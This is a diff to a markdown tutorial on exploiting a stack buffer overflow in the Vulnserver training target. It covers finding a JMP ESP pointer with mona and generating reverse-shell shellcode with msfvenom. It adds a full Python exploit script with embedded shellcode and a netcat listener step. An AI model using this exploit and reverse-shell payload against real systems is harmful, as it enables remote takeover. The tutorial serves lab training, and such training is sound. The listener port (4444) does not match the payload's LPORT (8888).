@@ -40,8 +40,10 @@ Buffer overflow vulnerabilities typically occur in code that:
 * [Finding the Offset](#finding-the-offset)
 * [Overwrighting the EIP](#overwriting-the-eip)
 * [Finding bad charaters](#finding-bad-charaters)
-* Finding the right module
-* Generating the shell code
+* [Finding the right module](#finding-the-right-module)
+* [Generating the shellcode](#generating-the-shellcode)
+
+
 
 ## Setup
 **Vulnserver**     
@@ -295,7 +297,9 @@ python badchars.py
 ## Finding the right module
 
 It's time to find what pointer you need to use to direct the program to your Shellcode for the Buffer Overflow
+
 1. Relaunch your Immunity and your program, reattach. This time, do not press the "play" button.
+
 2. Go into Immunity, and in the white space underneath the "terminals" type: 
 ```console
 !mona modules
@@ -306,7 +310,9 @@ It's time to find what pointer you need to use to direct the program to your She
 ![](/assets/images/monamodules.png)
 
 4. Write down this module, for example, essfunc.dll
+
 5. You are now going to identify the JMP ESP, which is crucial because it represents the pointer value and will be essential for using your Shellcode.
+
 6. JMP ESP converted to hex is FFE4, that's what you're looking for.
 ```console
 #FFE4 = "\xff\xe4"
@@ -319,10 +325,12 @@ It's time to find what pointer you need to use to direct the program to your She
 ```
 
 8. The -m switch represents the module that you're trying to find the JMP ESP for, ensure that you swap out essfunc.dll with whatever the module value you wrote down in step 4.
+
 9. When you use the command, you will get a column of results that look like this: 0x625011af 0x625011bb 0x625011c7 0x625011d3 0x625011df 0x625011eb 0x625011f7 0x62501203 0x62501205
 ![](/assets/images/monamodules2.png)
 
 10. Write down any of the column results that are mostly all "false." You will have to test these. In the instance of vulnserver, the result that will work is 625011af, but if you didn't know that, you might have to perform the next steps on multiple of these false column results.
+
 11. Edit the included script
 
 ```python
@@ -371,6 +379,7 @@ Ensure you edit the IP, port, and command of the script.
 ![](/assets/images/breakpoint.png)
 
 14. Now, you can click the "Play" button and observe "Running" in the bottom corner of Immunity.
+
 15. Run the python script Command:
 ```python
 python shellcodetest.py
@@ -378,3 +387,93 @@ python shellcodetest.py
 
 16. If you see the pointer value written to the EIP, you can now generate Shellcode. If you don't see it, repeat the process with other column pointer values you identified as false from Step 9.
 ![](/assets/images/eip3.png)
+
+## Generating the shellcode
+The last step in this process, generating Shellcode and ensuring that we can exploit the system.
+
+1. Restart Immunity/the exe program and get setup.
+
+2. Generate the Payload:
+```console
+msfvenom -p windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=8888 EXITFUNC=thread -f c -a x86 -b "\x00"
+```
+![](/assets/images/exploit.png)
+*Replace the LHOST with your Kali Machine IP and replace the -b switch with the bad characters that you had identified earlier. In this instance, there's only one bad character represented by "\x00"*
+
+4. Edit the included script.
+```python
+import socket
+from time import sleep
+
+ip = "127.0.0.1"
+port = 9999
+
+fuzzBuffer = "A"
+buffer = ""
+nops = "\x90"
+command = "TRUN /.:/"
+eipValue = "\xaf\x11\x50\x62"
+
+shellcode =("\xbe\x3d\x34\xbd\x7a\xdb\xd0\xd9\x74\x24\xf4\x5a\x33\xc9\xb1"
+"\x52\x31\x72\x12\x83\xc2\x04\x03\x4f\x3a\x5f\x8f\x53\xaa\x1d"
+"\x70\xab\x2b\x42\xf8\x4e\x1a\x42\x9e\x1b\x0d\x72\xd4\x49\xa2"
+"\xf9\xb8\x79\x31\x8f\x14\x8e\xf2\x3a\x43\xa1\x03\x16\xb7\xa0"
+"\x87\x65\xe4\x02\xb9\xa5\xf9\x43\xfe\xd8\xf0\x11\x57\x96\xa7"
+"\x85\xdc\xe2\x7b\x2e\xae\xe3\xfb\xd3\x67\x05\x2d\x42\xf3\x5c"
+"\xed\x65\xd0\xd4\xa4\x7d\x35\xd0\x7f\xf6\x8d\xae\x81\xde\xdf"
+"\x4f\x2d\x1f\xd0\xbd\x2f\x58\xd7\x5d\x5a\x90\x2b\xe3\x5d\x67"
+"\x51\x3f\xeb\x73\xf1\xb4\x4b\x5f\x03\x18\x0d\x14\x0f\xd5\x59"
+"\x72\x0c\xe8\x8e\x09\x28\x61\x31\xdd\xb8\x31\x16\xf9\xe1\xe2"
+"\x37\x58\x4c\x44\x47\xba\x2f\x39\xed\xb1\xc2\x2e\x9c\x98\x8a"
+"\x83\xad\x22\x4b\x8c\xa6\x51\x79\x13\x1d\xfd\x31\xdc\xbb\xfa"
+"\x36\xf7\x7c\x94\xc8\xf8\x7c\xbd\x0e\xac\x2c\xd5\xa7\xcd\xa6"
+"\x25\x47\x18\x68\x75\xe7\xf3\xc9\x25\x47\xa4\xa1\x2f\x48\x9b"
+"\xd2\x50\x82\xb4\x79\xab\x45\xc4\x7d\xb3\x94\x52\x7c\xb3\xb4"
+"\x1a\x09\x55\xd2\x4a\x5c\xce\x4b\xf2\xc5\x84\xea\xfb\xd3\xe1"
+"\x2d\x77\xd0\x16\xe3\x70\x9d\x04\x94\x70\xe8\x76\x33\x8e\xc6"
+"\x1e\xdf\x1d\x8d\xde\x96\x3d\x1a\x89\xff\xf0\x53\x5f\x12\xaa"
+"\xcd\x7d\xef\x2a\x35\xc5\x34\x8f\xb8\xc4\xb9\xab\x9e\xd6\x07"
+"\x33\x9b\x82\xd7\x62\x75\x7c\x9e\xdc\x37\xd6\x48\xb2\x91\xbe"
+"\x0d\xf8\x21\xb8\x11\xd5\xd7\x24\xa3\x80\xa1\x5b\x0c\x45\x26"
+"\x24\x70\xf5\xc9\xff\x30\x15\x28\xd5\x4c\xbe\xf5\xbc\xec\xa3"
+"\x05\x6b\x32\xda\x85\x99\xcb\x19\x95\xe8\xce\x66\x11\x01\xa3"
+"\xf7\xf4\x25\x10\xf7\xdc")
+
+print(f"[*] Connecting to {ip,port}")
+
+buffer = command    
+buffer += fuzzBuffer * 2003 + eipValue + nops * 32 + shellcode
+
+print(f"Sending payload, Buffer len: {len(buffer)}")
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.settimeout(5)
+try:
+    conn = s.connect((ip, port))
+    recv = s.recv(1024)
+    s.send(buffer.encode("latin-1"))
+    s.close()
+except:
+    s.close()
+    print(f"EIP Sent, Buffer Length: {len(buffer)}")
+```
+
+Ensure that your exploitation IP and Port and command values are correct. Take your generated Shellcode and replace the overflow value that is currently in the script.
+
+5. Ensure that all variables are correct, including your exact byte value, pointer value, etc.
+
+6. Start your netcat listener: 
+```powershell
+nc -lvp 4444
+```
+![](/assets/images/listen.png)
+
+
+7. Run the script:
+```console
+python bofpoc.py
+```
+
+8. If the shell doesn't catch, try to change the padding value in the script from 32 to 16 or 8. It may take some trial and error.
+
+9. You should now have a shell, congratulations.
+![](/assets/images/win.png)
